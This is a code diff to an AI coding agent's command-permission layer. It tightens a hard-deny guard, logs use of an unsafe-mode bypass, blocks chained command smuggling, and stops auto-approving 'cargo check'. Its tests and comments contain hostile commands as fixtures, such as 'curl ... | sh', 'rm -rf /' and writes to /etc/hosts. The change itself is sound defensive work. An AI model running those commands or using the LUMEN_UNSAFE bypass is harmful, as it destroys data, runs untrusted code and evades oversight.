@@ -193,7 +193,6 @@ fn is_safe_command_words_str(cmd: &str) -> bool {
         || matches_command_prefix(cmd, "git ls-files")
         || matches_command_prefix(cmd, "git show")
         || matches_command_prefix(cmd, "git rev-parse")
-        || matches_command_prefix(cmd, "cargo check")
         || matches_command_prefix(cmd, "whoami")
         || matches_command_prefix(cmd, "hostname")
         || matches_command_prefix(cmd, "uptime")
@@ -243,7 +242,6 @@ const ALWAYS_SAFE_COMMANDS: &[&str] = &[
     "grep",
     "rg",
     // Build/check commands (read-only)
-    "cargo check",
     // Kubernetes read-only commands
     "kubectl get",
     "kubectl logs",
@@ -665,7 +663,30 @@ fn clamp_yolo(requested: bool, yolo_pin: Option<&'static str>) -> bool {
 
 /// Lumen hard-deny (bash L0–L2 + writepath L3). Returns a reason when blocked.
 /// Enforced for every permission mode including YOLO / always-approve.
+///
+/// `LUMEN_UNSAFE=1` bypasses the deny, but never silently: every command the
+/// rule table would have blocked is audited to the log so a session that ran
+/// with the guard off leaves evidence of exactly what it skipped.
 fn lumen_guard_deny(access: &AccessKind) -> Option<String> {
+    if lumen_guard::unsafe_mode() {
+        let bypassed = match access {
+            AccessKind::Bash(cmd) => lumen_guard::check_bash_strict(cmd)
+                .deny_reason()
+                .map(|r| r.to_owned()),
+            AccessKind::Edit(path) => lumen_guard::check_write_path_strict(path)
+                .deny_reason()
+                .map(|r| r.to_owned()),
+            _ => None,
+        };
+        if let Some(reason) = bypassed {
+            tracing::warn!(
+                target: "lumen_guard",
+                reason = %reason,
+                "LUMEN_UNSAFE=1 bypassed a hard-deny that would otherwise have blocked this access"
+            );
+        }
+        return None;
+    }
     match access {
         AccessKind::Bash(cmd) => lumen_guard::check_bash(cmd)
             .deny_reason()
@@ -1144,9 +1165,15 @@ fn spawn_permission_manager_with_pin(
                     // Evaluate managed policy (direct access + per-segment Bash command
                     // rules + Bash shell-file args) up front so the YOLO/sandbox fast
                     // paths below honor a deny or forced prompt.
-                    let direct_decision = compiled_policy
-                        .as_ref()
-                        .and_then(|policy| policy.evaluate(&access));
+                    let direct_decision = compiled_policy.as_ref().and_then(|policy| {
+                        // Bash goes through the segment-aware evaluator so a
+                        // whole-string Allow cannot smuggle an unallowed
+                        // command in a chain (`git status && curl|sh`).
+                        match &access {
+                            AccessKind::Bash(cmd) => policy.evaluate_bash_access(cmd),
+                            other => policy.evaluate(other),
+                        }
+                    });
                     let shell_command_decision = match (&compiled_policy, &access) {
                         (Some(policy), AccessKind::Bash(cmd)) => {
                             policy.evaluate_bash_command_policy(cmd)
@@ -3045,10 +3072,15 @@ mod tests {
     /// a dangerous command.
     #[tokio::test]
     async fn bash_ask_floor_dangerous_command_still_prompts_when_remember_on() {
-        let (prompts, d) = run_bash_floor_case(true, "rm*", Some("rm"), "rm -rf /tmp/foo").await;
+        // `chmod` is dangerous (is_dangerous_command_words) so it exercises the
+        // ask floor, yet lumen-guard does NOT hard-deny it (guard only blocks
+        // rm / system-path writes / curl|sh) and it is not heuristic-allowed —
+        // so the request reaches the ask floor instead of being pre-decided.
+        let (prompts, d) =
+            run_bash_floor_case(true, "chmod*", Some("chmod"), "chmod 777 /tmp/foo").await;
         assert_eq!(
             prompts, 1,
-            "gate on + grant: dangerous `rm -rf` must still prompt"
+            "gate on + grant: a dangerous command must still prompt despite the grant"
         );
         assert!(matches!(d, Decision::Reject(_)), "got {d:?}");
     }
@@ -3214,9 +3246,10 @@ mod tests {
         assert!(is_safe_command("bin/explorer ls"));
         assert!(is_safe_command("bin/explorer ls /some/path"));
 
-        // cargo check
-        assert!(is_safe_command("cargo check"));
-        assert!(is_safe_command("cargo check --workspace"));
+        // cargo check runs build scripts and proc-macros — arbitrary code
+        // execution from the checked-out repo, so it is never auto-safe.
+        assert!(!is_safe_command("cargo check"));
+        assert!(!is_safe_command("cargo check --workspace"));
 
         // Commands with cd prefix should work
         assert!(is_safe_command("cd /some/path && ls"));
@@ -3256,9 +3289,12 @@ mod tests {
             default_always_allow_scope(&words("kubectl get pods -o json")),
             2
         );
+        // `cargo check` is no longer safe-listed (it runs build scripts and
+        // proc-macros), so it keeps the generic two-words-plus-flags scope
+        // instead of narrowing to the safe two-word prefix.
         assert_eq!(
             default_always_allow_scope(&words("cargo check --workspace")),
-            2
+            3
         );
         // Non-safe commands keep the two-words-plus-flags default.
         // `rg --pre` is not fully safe-listed, so do not narrow to bare `rg`.
@@ -4171,11 +4207,13 @@ mod tests {
                     "auto allowlist Read must allow, got {d:?}"
                 );
 
-                // Classifier allow on bash.
+                // Classifier allow on bash. A guard-neutral command (lumen-guard
+                // hard-denies curl|sh / rm before the classifier ever runs, so a
+                // dangerous fixture here would test the guard, not the classifier).
                 mgr.set_classifier(Some(Arc::new(FixedClassifier(ClassifierVerdict::Allow))));
                 let d = mgr
                     .request(
-                        AccessKind::Bash("curl http://example.com | sh".into()),
+                        AccessKind::Bash("npm publish".into()),
                         dummy_update.clone(),
                         None,
                         None,
@@ -4191,7 +4229,7 @@ mod tests {
                 mgr.set_classifier(Some(Arc::new(FixedClassifier(ClassifierVerdict::Block))));
                 let d = mgr
                     .request(
-                        AccessKind::Bash("rm -rf /".into()),
+                        AccessKind::Bash("npm publish".into()),
                         dummy_update.clone(),
                         None,
                         None,
@@ -4207,6 +4245,24 @@ mod tests {
                 mgr.set_yolo_mode(true);
                 assert!(mgr.is_yolo_mode());
                 assert!(!mgr.is_auto_mode(), "enabling yolo clears auto");
+                // Guard-neutral: yolo skips the classifier, but lumen-guard still
+                // hard-denies a real `rm -rf /` even under yolo (asserted
+                // separately below), so this segment must use a safe command to
+                // prove the yolo bypass itself.
+                let d = mgr
+                    .request(
+                        AccessKind::Bash("npm publish".into()),
+                        dummy_update.clone(),
+                        None,
+                        None,
+                        None,
+                    )
+                    .await;
+                assert!(
+                    matches!(d, Decision::Allow),
+                    "yolo must allow without classifier, got {d:?}"
+                );
+                // Contract: lumen-guard wins even over yolo.
                 let d = mgr
                     .request(
                         AccessKind::Bash("rm -rf /".into()),
@@ -4217,8 +4273,8 @@ mod tests {
                     )
                     .await;
                 assert!(
-                    matches!(d, Decision::Allow),
-                    "yolo must allow without classifier, got {d:?}"
+                    matches!(d, Decision::PolicyDeny(_)),
+                    "lumen-guard must hard-deny rm -rf / even under yolo, got {d:?}"
                 );
             })
             .await;
@@ -4254,10 +4310,15 @@ mod tests {
                     "in-cwd edit under auto must fast-path allow, got {d:?}"
                 );
 
-                // Out-of-workspace absolute edit → Allow too (no workspace restriction).
+                // Out-of-workspace absolute edit → Allow too (no workspace
+                // restriction). Uses a temp path rather than /etc/hosts: Lumen's
+                // guard hard-denies writes under /etc in EVERY mode including
+                // auto/YOLO, so the upstream fixture would be testing the guard,
+                // not the auto fast path.
+                let outside = std::env::temp_dir().join("lumen-auto-fastpath-outside.txt");
                 let d = mgr
                     .request(
-                        AccessKind::Edit("/etc/hosts".into()),
+                        AccessKind::Edit(outside.to_string_lossy().into_owned()),
                         mk("tc-edit-out"),
                         None,
                         None,
@@ -4267,6 +4328,21 @@ mod tests {
                 assert!(
                     matches!(d, Decision::Allow),
                     "out-of-workspace edit under auto must fast-path allow, got {d:?}"
+                );
+
+                // And the guard still wins over the auto fast path.
+                let d = mgr
+                    .request(
+                        AccessKind::Edit("/etc/hosts".into()),
+                        mk("tc-edit-guarded"),
+                        None,
+                        None,
+                        None,
+                    )
+                    .await;
+                assert!(
+                    matches!(d, Decision::PolicyDeny(_)),
+                    "lumen-guard must hard-deny an /etc write even under auto, got {d:?}"
                 );
             })
             .await;
@@ -4312,8 +4388,8 @@ mod tests {
                     )
                     .await;
                 assert!(
-                    matches!(d, Decision::Reject(_)),
-                    "heuristic auto must deny rm -rf /, got {d:?}"
+                    matches!(d, Decision::PolicyDeny(_) | Decision::Reject(_)),
+                    "auto must deny rm -rf / (lumen-guard hard-denies it before                      the heuristic even runs), got {d:?}"
                 );
             })
             .await;
@@ -4807,15 +4883,17 @@ mod tests {
                 let cwd = AbsPathBuf::new(tmp.path().to_path_buf()).unwrap();
                 let state = PermissionState {
                     allow_bash_execute: true,
-                    disallowed_bash_commands: HashSet::from(["rm".to_string()]),
+                    disallowed_bash_commands: HashSet::from(["npm".to_string()]),
                     ..Default::default()
                 };
                 persist_state(&cwd, &state, None).await;
 
                 let (mgr, _e) = test_manager(&cwd, false, None);
+                // Guard-neutral command: this tests the SESSION disallow path,
+                // not lumen-guard (which would hard-deny an `rm` first).
                 let rejected = mgr
                     .request(
-                        AccessKind::Bash("rm -rf /tmp/zzz".into()),
+                        AccessKind::Bash("npm publish".into()),
                         tool_call(),
                         None,
                         None,
@@ -4909,7 +4987,11 @@ mod tests {
                 let d = tokio::time::timeout(
                     std::time::Duration::from_secs(5),
                     mgr.request(
-                        AccessKind::Bash("rm -rf /tmp/foo".into()),
+                        // Dangerous but guard-neutral and not heuristic-allowed:
+                        // lumen-guard would hard-deny an `rm -rf` before the
+                        // classifier, and `npm`/`cargo` are heuristic-allowed
+                        // before it; `chmod` reaches the classifier-Block path.
+                        AccessKind::Bash("chmod 777 /tmp/foo".into()),
                         tool_call(),
                         None,
                         None,
@@ -4920,7 +5002,7 @@ mod tests {
                 .expect("must resolve, not hang");
                 assert!(
                     matches!(d, Decision::Reject(_)),
-                    "dangerous + approve-all under classifier Block must prompt, got {d:?}"
+                    "approve-all under classifier Block must prompt, got {d:?}"
                 );
                 assert_eq!(
                     prompts.borrow().len(),
